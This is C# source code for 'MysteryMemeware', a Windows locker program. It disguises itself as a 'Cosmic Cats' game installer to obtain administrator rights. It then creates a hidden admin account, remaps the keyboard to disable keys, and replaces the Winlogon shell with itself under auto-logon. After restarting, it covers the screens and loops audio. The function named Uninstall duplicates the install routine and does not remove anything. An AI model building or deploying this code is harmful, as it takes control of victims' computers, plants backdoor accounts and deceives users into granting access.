namespace MysteryMemeware
{
    public static class Program
    {
        #region Build Settings
        public const string PasswordCharset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/";
        public const string DefaultInstallLocation = "C:\\MysteryMemeware.exe";
        public const string SettingsRegistryLocation = "SOFTWARE\\MysteryMemeware";
        public const uint MaximumUsernameRetries = 1000;
        public const uint MaximumInstallLocationRetries = 10000;
        public const string DefaultUsername = "MysteryUser";
        public const bool AllowImmunity = true;
        public const bool AllowFailSafe = true;
        public const string AudioEmbeddedResourceName = "MysteryMemeware.Music.wav";
        public const string ImmunityMessageTitle = "Mystery Immunity Activated.";
        public const string ImmunityMessageBody = "Your computer is marked as immune to Mystery Memeware and so the program will now be closed.";
        #endregion
        //MAP
        [System.STAThread]
        public static void Main()
        {
            try
            {
                RunImmunityCheck();

                RunFailSafe();

                if (IsInstalled())
                {
                    Run();
                }
                else if (IsAdmin())
                {
                    Install();
                }
                else
                {
                    BegForAdmin();
                }
            }
            catch (System.Exception exception)
            {
                System.Windows.Forms.MessageBox.Show("MysteryMemeware failed due to exception: " + exception.Message, "Mystery Exception Thrown!", System.Windows.Forms.MessageBoxButtons.OK);
            }

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        //MAP
        public static void RunFailSafe()
        {
            long pressStartTime = 0;
            System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();

            System.Timers.Timer timer = new System.Timers.Timer();
            timer.AutoReset = true;
            timer.Interval = 100;

            timer.Elapsed += (object sender, System.Timers.ElapsedEventArgs e) =>
            {
                bool escapeDown = GetKeyState(88) < -64;

                if (escapeDown && pressStartTime == 0)
                {
                    pressStartTime = stopwatch.ElapsedTicks;
                }
                else if (!escapeDown)
                {
                    pressStartTime = 0;
                }

                if (stopwatch.ElapsedTicks - pressStartTime >= 50000000 && pressStartTime != 0)
                {
                    Uninstall();
                }
            };

            timer.Start();

            stopwatch.Start();
        }
        public static void Run()
        {
            VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();
            DisplayCoverModule.CoverDisplays();

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream(AudioEmbeddedResourceName));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        public static void Install()
        {
            uint InstallID = 0;
            string InstallLocation = "C:\\MysteryMemeware.exe";

            while (true)
            {
                try
                {
                    if (InstallID == 0)
                    {
                        InstallLocation = "C:\\MysteryMemeware.exe";
                    }
                    else
                    {
                        InstallLocation = "C:\\MysteryMemeware" + InstallID.ToString() + ".exe";
                    }

                    if (System.IO.File.Exists(InstallLocation))
                    {
                        InstallID++;
                    }
                    else
                    {
                        System.IO.File.Copy(typeof(Program).Assembly.Location, InstallLocation);

                        break;
                    }
                }
                catch
                {
                    InstallID++;
                }
            }

            System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

            char[] PasswordChars = new char[12];

            for (int i = 0; i < PasswordChars.Length; i++)
            {
                PasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/"[RNG.Next(0, 62)];
            }

            string Password = new string(PasswordChars);

            uint UserID = 0;

            string Username = "MysteryUser";

            while (true)
            {
                try
                {
                    if (UserID == 0)
                    {
                        Username = "MysteryUser";
                    }
                    else
                    {
                        Username = "MysteryUser" + UserID.ToString();
                    }

                    System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
                    System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Username, "user");
                    NewUser.Invoke("SetPassword", new object[] { Password });
                    NewUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
                    NewUser.CommitChanges();

                    System.DirectoryServices.DirectoryEntry grp = AD.Children.Find("Administrators", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                    }

                    break;
                }
                catch
                {
                    UserID++;
                }
            }


            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            WinLogon.SetValue("Shell", InstallLocation);
            WinLogon.SetValue("DefaultUserName", Username);
            WinLogon.SetValue("DefaultPassword", Password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("IsInstalled", "true");
            MysteryMemeware.SetValue("InstallLocation", InstallLocation);
            MysteryMemeware.SetValue("MysteryUserID", UserID.ToString());
            MysteryMemeware.SetValue("MysteryUsername", Username);
            MysteryMemeware.SetValue("MysteryPassword", MysteryMemeware);

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            Software.Flush();
            Software.Close();
            Software.Dispose();

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            WinLogOffModule.Restart();

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public static void BegForAdmin()
        {
            if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
            {
                return;
            }

            if (System.Windows.Forms.MessageBox.Show("Administrator access is required in order to install Cosmic Cats. Please select yes on the following popup to grant administrator, or you may select no to cancel the installation.", "Administrator Access Requested.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
            {
                return;
            }

            try
            {
                System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(typeof(Program).Assembly.Location);
                processStartInfo.Verb = "runas";
                System.Diagnostics.Process.Start(processStartInfo);

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                if (ex.NativeErrorCode != 1223)
                {
                    throw ex;
                }
                System.Windows.Forms.MessageBox.Show("Administrator access was denied and therefore Cosmic Cats could not be installed.", "Insufficient Permissions.", System.Windows.Forms.MessageBoxButtons.OK);
            }
        }
        public static void Uninstall()
        {
            //Restart now command
            //"cmd /C shutdown /r /f /t 0"

            //Delete file command
            //"cmd /C delete \"C:\\MysteryMemeware.exe\""

            //Wait command
            //"cmd /C timeout /T 5 /NOBREAK"

            //


            uint InstallID = 0;
            string InstallLocation = "C:\\MysteryMemeware.exe";

            while (true)
            {
                try
                {
                    if (InstallID == 0)
                    {
                        InstallLocation = "C:\\MysteryMemeware.exe";
                    }
                    else
                    {
                        InstallLocation = "C:\\MysteryMemeware" + InstallID.ToString() + ".exe";
                    }

                    if (System.IO.File.Exists(InstallLocation))
                    {
                        InstallID++;
                    }
                    else
                    {
                        System.IO.File.Copy(typeof(Program).Assembly.Location, InstallLocation);

                        break;
                    }
                }
                catch
                {
                    InstallID++;
                }
            }

            System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

            char[] PasswordChars = new char[12];

            for (int i = 0; i < PasswordChars.Length; i++)
            {
                PasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
            }

            string Password = new string(PasswordChars);

            uint UserID = 0;

            string Username = "MysteryUser";

            while (true)
            {
                try
                {
                    if (UserID == 0)
                    {
                        Username = "MysteryUser";
                    }
                    else
                    {
                        Username = "MysteryUser" + UserID.ToString();
                    }

                    System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
                    System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Username, "user");
                    NewUser.Invoke("SetPassword", new object[] { Password });
                    NewUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
                    NewUser.CommitChanges();

                    System.DirectoryServices.DirectoryEntry grp = AD.Children.Find("Administrators", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                    }

                    break;
                }
                catch
                {
                    UserID++;
                }
            }


            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            WinLogon.SetValue("Shell", InstallLocation);
            WinLogon.SetValue("DefaultUserName", Username);
            WinLogon.SetValue("DefaultPassword", Password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("IsInstalled", "true");
            MysteryMemeware.SetValue("InstallLocation", InstallLocation);
            MysteryMemeware.SetValue("MysteryUserID", UserID.ToString());
            MysteryMemeware.SetValue("MysteryUsername", Username);
            MysteryMemeware.SetValue("MysteryPassword", MysteryMemeware);

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            Software.Flush();
            Software.Close();
            Software.Dispose();

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            WinLogOffModule.Restart();

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public static void RunImmunityCheck()
        {
            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

            if (mysteryMemeware is null)
            {
                return;
            }

            object isImmune = mysteryMemeware.GetValue("IsImmune");

            mysteryMemeware.Close();
            mysteryMemeware.Dispose();

            LocalMachine.Close();
            LocalMachine.Dispose();

            if (isImmune is null)
            {
                return;
            }

            if (isImmune.GetType() != typeof(string))
            {
                return;
            }

            string isInstalledString = (string)isImmune;

            if (isInstalledString.ToLower() == "true" && AllowImmunity)
            {
                System.Windows.Forms.MessageBox.Show("Your computer is marked as immune to MysteryMemeware and so the program has been closed.", "Mystery Immunity Invoked!", System.Windows.Forms.MessageBoxButtons.OK);

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
        }
        public static bool IsInstalled()
        {
            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

            if (mysteryMemeware is null)
            {
                return false;
            }

            object isInstalled = mysteryMemeware.GetValue("IsInstalled");

            mysteryMemeware.Close();
            mysteryMemeware.Dispose();

            LocalMachine.Close();
            LocalMachine.Dispose();

            if (isInstalled is null)
            {
                return false;
            }

            if (isInstalled.GetType() != typeof(string))
            {
                return false;
            }

            string isInstalledString = (string)isInstalled;

            return isInstalledString.ToLower() == "true";
        }
        public static bool IsAdmin()
        {
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        [System.Runtime.InteropServices.DllImport("USER32.dll")]
        private static extern short GetKeyState(int virtualKeyID);
    }
}